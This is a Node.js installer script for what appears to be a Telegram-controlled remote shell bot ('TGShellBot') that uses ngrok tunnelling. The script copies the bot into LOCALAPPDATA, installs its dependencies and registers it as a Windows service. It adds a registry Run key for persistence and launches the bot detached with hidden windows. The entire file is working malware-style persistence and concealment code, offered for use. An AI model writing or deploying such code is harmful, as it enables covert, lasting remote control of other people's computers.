const fs = require('fs-extra');
const path = require('path');
const WinReg = require('winreg');
const { Service } = require('node-windows');
const { execSync, spawn } = require('child_process');

async function install() {
    // Create installation directory in AppData
    const appDataPath = process.env.LOCALAPPDATA;
    const installPath = path.join(appDataPath, 'TGShellBot');
    
    try {
        // Create installation directory
        await fs.ensureDir(installPath);

        // Copy bot.js to installation directory
        const botScript = path.join(__dirname, 'bot.js');
        await fs.copy(botScript, path.join(installPath, 'bot.js'));

        // Create package.json for bot dependencies
        const botPackageJson = {
            "name": "tg-shell-bot",
            "version": "1.0.0",
            "dependencies": {
                "node-telegram-bot-api": "^0.66.0",
                "express": "^4.21.2",
                "ngrok": "^5.0.0-beta.2",
                "child_process": "^1.0.2",
                "fs": "^0.0.1-security",
                "path": "^0.12.7"
            }
        };

        await fs.writeJSON(path.join(installPath, 'package.json'), botPackageJson);

        // Install bot dependencies
        console.log('Installing bot dependencies...');
        execSync('npm install', { cwd: installPath });

        // Create Windows service
        const svc = new Service({
            name: 'TGShellBot',
            description: 'Telegram Shell Bot Service',
            script: path.join(installPath, 'bot.js'),
            nodeOptions: ['--no-window']
        });

        // Install the service
        svc.install();

        // Add to startup registry
        const regKey = new WinReg({
            hive: WinReg.HKCU,
            key: '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        });

        regKey.set('TGShellBot', WinReg.REG_SZ, `"${process.execPath}" "${path.join(installPath, 'bot.js')}" --no-window`, (err) => {
            if (err) {
                console.error('Failed to add to startup:', err);
            } else {
                console.log('Added to startup successfully');
            }
        });

        // Create service wrapper script
        const wrapperScript = `
        const { spawn } = require('child_process');
        const path = require('path');

        // Start bot without console window
        const bot = spawn(process.execPath, [path.join(__dirname, 'bot.js')], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });

        bot.unref();
        `;

        await fs.writeFile(path.join(installPath, 'service.js'), wrapperScript);

        console.log('Installation completed successfully!');
        console.log(`Bot installed at: ${installPath}`);
        
        // Start the bot immediately
        const bot = spawn(process.execPath, [path.join(installPath, 'bot.js')], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
        bot.unref();

    } catch (error) {
        console.error('Installation failed:', error);
        process.exit(1);
    }
}

install(); 